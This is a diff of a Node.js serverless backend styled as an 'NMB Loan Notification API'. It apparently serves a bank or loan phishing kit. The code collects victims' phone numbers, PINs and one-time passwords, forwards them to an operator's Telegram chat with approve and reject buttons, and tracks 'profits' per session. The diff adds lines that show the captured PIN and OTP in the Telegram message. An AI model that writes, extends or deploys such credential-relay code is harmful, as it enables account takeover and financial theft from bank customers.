@@ -38,9 +38,6 @@ function parseAmount(text) {
   return isNaN(n) ? null : n;
 }
 
-// State is now persisted via the shared `store` module (see ../store.js),
-// so it survives cold starts and is visible to every serverless instance.
-
 function tgApi(method, payload, cb) {
   const data = JSON.stringify(payload);
   const req = https.request(
@@ -70,11 +67,9 @@ function esc(s) {
 }
 
 async function readBody(req) {
-  return new Promise((resolve) => {
-    let raw = '';
-    req.on('data', (c) => (raw += c));
-    req.on('end', () => resolve(raw));
-  });
+  const chunks = [];
+  for await (const chunk of req) chunks.push(chunk);
+  return Buffer.concat(chunks).toString();
 }
 
 async function notifyApplication(app) {
@@ -144,8 +139,8 @@ async function notifyLoginVerification(login) {
 
   const approveLabel = type === 'pin' ? '✅ Correct' : '✅ Approve OTP';
   const rejectLabel = type === 'pin' ? '❌ Wrong' : '❌ Reject OTP';
-  const approveData = type === 'pin' ? `correct:${id}` : `otp_approve:${id}`;
-  const rejectData = type === 'pin' ? `wrong:${id}` : `otp_reject:${id}`;
+  const approveData = type === 'pin' ? `approve_pin:${id}:${login.username}` : `otp_approve:${id}:${login.username}`;
+  const rejectData = type === 'pin' ? `reject_pin:${id}:${login.username}` : `otp_reject:${id}:${login.username}`;
 
   tgApi('sendMessage', {
     chat_id: CHAT_ID,
@@ -174,7 +169,10 @@ async function notifyLoginVerification(login) {
 }
 
 async function handleCallback(cq) {
-  const [action, id] = (cq.data || '').split(':');
+  const parts = (cq.data || '').split(':');
+  const action = parts[0];
+  const id = parts[1];
+  const phone = parts.slice(2).join(':') || null;
 
   if (action === 'approve' || action === 'reject') {
     const decision = action === 'approve' ? 'approved' : 'rejected';
@@ -202,32 +200,34 @@ async function handleCallback(cq) {
     return;
   }
 
-  if (action === 'correct' || action === 'wrong' || action === 'otp_approve' || action === 'otp_reject') {
-    const decision = (action === 'correct' || action === 'otp_approve') ? 'approved' : 'rejected';
-    const kind = (action === 'correct' || action === 'wrong') ? 'PIN' : 'OTP';
-    const stamp = (action === 'correct' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
+  if (action === 'approve_pin' || action === 'reject_pin' || action === 'otp_approve' || action === 'otp_reject') {
+    const decision = (action === 'approve_pin' || action === 'otp_approve') ? 'approved' : 'rejected';
+    const kind = (action === 'approve_pin' || action === 'reject_pin') ? 'PIN' : 'OTP';
+    const stamp = (action === 'approve_pin' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
     console.log(`[${kind.toLowerCase()} callback] Received: action=${action}, id=${id}`);
     const rec = await store.get(store.NS.LOGIN, id);
-    console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec);
+    console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec, rec?.phone);
     if (rec) {
       rec.status = decision;
       rec.decided = true;
       await store.set(store.NS.LOGIN, id, rec);
+      const verify = await store.get(store.NS.LOGIN, id);
+      console.log(`[${kind.toLowerCase()} callback] Verified update:`, verify?.decided, verify?.status);
     } else {
-      // On Vercel without KV, records can't be shared between requests
-      // Just acknowledge the callback gracefully
-      console.log(`[callback] No record found (expected on Vercel without KV) - id:`, id);
+      console.error(`[${kind.toLowerCase()} decision] ${id} not found`);
     }
     tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
-    if (rec && rec.chatId && rec.messageId) {
+    if (rec && rec.messageId) {
       tgApi('editMessageText', {
         chat_id: rec.chatId,
         message_id: rec.messageId,
         parse_mode: 'HTML',
         text:
           `<b>🔐 ${kind} Verification</b>\n\n` +
-          (rec.phone ? `User: ${esc(rec.phone)}\n` : '') +
-          `Time: ${new Date().toLocaleString()}\n\n` +
+          `User: ${esc(rec.phone || 'N/A')}\n` +
+          (kind === 'PIN' && rec.pin ? `PIN: ${esc(rec.pin)}\n` : '') +
+          (kind === 'OTP' && rec.otp ? `OTP: ${esc(rec.otp)}\n` : '') +
+          `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
           `Status: <b>${stamp}</b>`,
       });
     }
@@ -236,15 +236,13 @@ async function handleCallback(cq) {
   }
 }
 
-// Handle admin free-text messages (profit/payment)
 async function handleMessage(msg) {
   const text = msg.text || '';
-  if (text.startsWith('/start')) return; // ignore /start
+  if (text.startsWith('/start')) return;
 
   const chatId = msg.chat.id;
   const replyToMsgId = msg.reply_to_message && msg.reply_to_message.message_id;
 
-  // Find target session
   let targetId = null;
   const sessions = (await store.get(store.NS.SESSIONS)) || {};
   if (replyToMsgId) {
@@ -282,14 +280,19 @@ function setWebhook(host, proto, cb) {
   tgApi('setWebhook', { url }, cb);
 }
 
+function sendJson(res, status, data) {
+  res.setHeader('Content-Type', 'application/json');
+  res.end(JSON.stringify(data));
+}
+
 // Vercel serverless entry point
 module.exports = async (req, res) => {
   try {
     if (!TOKEN || !CHAT_ID) {
       console.error('Missing NMB_BOT_TOKEN or NMB_CHAT_ID environment variables');
       res.setHeader('Content-Type', 'application/json');
-      res.status(500).end(JSON.stringify({ error: 'Server misconfigured: missing Telegram credentials' }));
-      return;
+      res.statusCode = 500;
+      return sendJson(res, 500, { error: 'Server misconfigured: missing Telegram credentials' });
     }
 
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -297,57 +300,56 @@ module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
     res.setHeader('Cache-Control', 'no-store');
 
-    if (req.method === 'OPTIONS') { res.status(204).end(); return; }
+    if (req.method === 'OPTIONS') { res.statusCode = 204; return res.end(); }
 
     const url = req.url || '';
 
-    // GET /api/setup/purge-webhook -> clear webhook to allow local polling
-    if (req.method === 'GET' && url.startsWith('/api/setup/purge-webhook')) {
-      tgApi('setWebhook', { url: '' }, (r) => {
-        res.setHeader('Content-Type', 'application/json');
-        res.status(200).end(JSON.stringify({ ok: r && r.ok, description: r && r.description }));
+    if (req.method === 'GET' && url.includes('setup')) {
+      const host = req.headers['x-forwarded-host'] || req.headers.host;
+      const proto = req.headers['x-forwarded-proto'] || 'https';
+      tgApi('setWebhook', { url: `${proto}://${host}/api` }, (r) => {
+        res.statusCode = 200;
+        sendJson(res, 200, { ok: r && r.ok, description: r && r.description, webhook: `${proto}://${host}/api` });
       });
       return;
     }
 
-    // GET /api/setup-webhook -> set webhook for Vercel serverless
-    if (req.method === 'GET' && url.includes('setup')) {
-      const host = req.headers['x-forwarded-host'] || req.headers.host;
-      const proto = req.headers['x-forwarded-proto'] || 'https';
-      setWebhook(host, proto, (r) => {
-        res.setHeader('Content-Type', 'application/json');
-        res.status(200).end(JSON.stringify({ ok: r && r.ok, description: r && r.description, webhook: `${proto}://${host}/api` }));
+    if (req.method === 'GET' && url.startsWith('/api/setup/purge-webhook')) {
+      tgApi('setWebhook', { url: '' }, (r) => {
+        res.statusCode = 200;
+        sendJson(res, 200, { ok: r && r.ok, description: r && r.description });
       });
       return;
+    }
+
+    if (req.url === '/api/health') {
+      res.statusCode = 200;
+      return sendJson(res, 200, { ok: true, server: 'running', env: { TOKEN: !!TOKEN, CHAT_ID: !!CHAT_ID } });
     }
 
     if (req.method === 'GET' && url.startsWith('/api/application/')) {
       const id = url.split('/').pop();
       const rec = await store.get(store.NS.APPS, id);
-      res.setHeader('Content-Type', 'application/json');
-      res.status(200).end(JSON.stringify({ status: rec ? rec.status : 'unknown' }));
-      return;
+      res.statusCode = 200;
+      return sendJson(res, 200, { status: rec ? rec.status : 'unknown' });
     }
 
     if (req.method === 'GET' && url.startsWith('/api/login/status/')) {
       const id = url.split('/').pop();
       const rec = await store.get(store.NS.LOGIN, id);
-      res.setHeader('Content-Type', 'application/json');
-      res.status(200).end(JSON.stringify({
+      res.statusCode = 200;
+      return sendJson(res, 200, {
         decided: !!rec && !!rec.decided,
         status: rec ? rec.status : 'pending',
         found: !!rec,
         sharedStore: store.shared,
         storage: store.usingKV ? 'kv' : 'local'
-      }));
-      return;
+      });
     }
 
-    // POST /api/session -> create session
     if (req.method === 'POST' && url === '/api/session') {
       const raw = await readBody(req);
-      let p = {};
-      try { p = JSON.parse(raw || '{}'); } catch (e) {}
+      const p = JSON.parse(raw || '{}');
       const sessionId = p.sessionId || ('SESS-' + Date.now());
       await store.set(store.NS.SESSIONS, sessionId, {
         id: sessionId,
@@ -357,30 +359,24 @@ module.exports = async (req, res) => {
         pendingTrack: false,
         trackMsgId: null
       });
-      res.setHeader('Content-Type', 'application/json');
-      res.status(200).end(JSON.stringify({ ok: true, sessionId }));
-      return;
+      res.statusCode = 200;
+      return sendJson(res, 200, { ok: true, sessionId });
     }
 
-    // GET /api/session/:id -> get session state
     if (req.method === 'GET' && url.startsWith('/api/session/')) {
       const id = url.split('/').pop();
       const rec = await store.get(store.NS.SESSIONS, id);
-      res.setHeader('Content-Type', 'application/json');
-      res.status(200).end(JSON.stringify(rec || { id, balance: 0, paymentDetails: '', profits: [] }));
-      return;
+      res.statusCode = 200;
+      return sendJson(res, 200, rec || { id, balance: 0, paymentDetails: '', profits: [] });
     }
 
-    // POST /api/track-profits -> notify admin
     if (req.method === 'POST' && url === '/api/track-profits') {
       const raw = await readBody(req);
-      let p = {};
-      try { p = JSON.parse(raw || '{}'); } catch (e) {}
+      const p = JSON.parse(raw || '{}');
       const { sessionId, phone } = p;
       if (!sessionId) {
-        res.setHeader('Content-Type', 'application/json');
-        res.status(400).end(JSON.stringify({ error: 'sessionId required' }));
-        return;
+        res.statusCode = 400;
+        return sendJson(res, 400, { error: 'sessionId required' });
       }
       const rec = await store.get(store.NS.SESSIONS, sessionId) || {
         id: sessionId, balance: 0, paymentDetails: '', profits: [], pendingTrack: true
@@ -397,12 +393,10 @@ module.exports = async (req, res) => {
           pushSession(sessionId, 'track-requested', { phone });
         }
       });
-      res.setHeader('Content-Type', 'application/json');
-      res.status(200).end(JSON.stringify({ ok: true }));
-      return;
+      res.statusCode = 200;
+      return sendJson(res, 200, { ok: true });
     }
 
-    // GET /api/stream/:id -> SSE for instant updates
     if (req.method === 'GET' && url.startsWith('/api/stream/')) {
       const id = url.split('/').pop();
       res.setHeader('Content-Type', 'text/event-stream');
@@ -423,57 +417,51 @@ module.exports = async (req, res) => {
     }
 
     if (req.method === 'POST') {
-      let raw = '';
-      req.on('data', (c) => (raw += c));
-      req.on('end', async () => {
-        let p = {};
-        try { p = JSON.parse(raw || '{}'); } catch (e) { /* ignore */ }
+      const raw = [];
+      for await (const chunk of req) raw.push(chunk);
+      const p = JSON.parse(Buffer.concat(raw).toString() || '{}');
 
-        try {
-          if (p.callback_query) {
-            await handleCallback(p.callback_query);
-            res.setHeader('Content-Type', 'application/json');
-            res.status(200).end(JSON.stringify({ ok: true }));
-            return;
-          }
-          if (p.message) {
-            await handleMessage(p.message);
-            res.setHeader('Content-Type', 'application/json');
-            res.status(200).end(JSON.stringify({ ok: true }));
-            return;
-          }
-          if (url.includes('application')) {
-            const id = await notifyApplication(p);
-            res.setHeader('Content-Type', 'application/json');
-            res.status(200).end(JSON.stringify({ ok: true, appId: id }));
-            return;
-          }
-          if (url.includes('login')) {
-            const id = await notifyLoginVerification(p);
-            res.setHeader('Content-Type', 'application/json');
-            res.status(200).end(JSON.stringify({ ok: true, loginId: id }));
-            return;
-          }
-          res.setHeader('Content-Type', 'application/json');
-          res.status(404).end(JSON.stringify({ error: 'not found' }));
-        } catch (e) {
-          console.error('[api] request error:', e);
-          if (!res.headersSent) {
-            res.setHeader('Content-Type', 'application/json');
-            res.status(500).end(JSON.stringify({ error: 'Internal server error' }));
-          }
+      try {
+        if (p.callback_query) {
+          await handleCallback(p.callback_query);
+          res.statusCode = 200;
+          return sendJson(res, 200, { ok: true });
         }
-      });
-      return;
+        if (p.message) {
+          await handleMessage(p.message);
+          res.statusCode = 200;
+          return sendJson(res, 200, { ok: true });
+        }
+        if (url.includes('application')) {
+          const id = await notifyApplication(p);
+          res.statusCode = 200;
+          return sendJson(res, 200, { ok: true, appId: id });
+        }
+        if (url.includes('login')) {
+          const id = await notifyLoginVerification(p);
+          res.statusCode = 200;
+          return sendJson(res, 200, { ok: true, loginId: id });
+        }
+        res.statusCode = 404;
+        return sendJson(res, 404, { error: 'not found' });
+      } catch (e) {
+        console.error('[api] request error:', e);
+        if (!res.headersSent) {
+          res.statusCode = 500;
+          return sendJson(res, 500, { error: 'Internal server error' });
+        }
+      }
     }
 
     res.setHeader('Content-Type', 'text/plain');
-    res.status(200).end('NMB Loan Notification API');
+    res.statusCode = 200;
+    res.end('NMB Loan Notification API');
   } catch (e) {
     console.error('[api] unhandled error:', e);
     if (!res.headersSent) {
       res.setHeader('Content-Type', 'application/json');
-      res.status(500).end(JSON.stringify({ error: 'Internal server error' }));
+      res.statusCode = 500;
+      sendJson(res, 500, { error: 'Internal server error' });
     }
   }
 };
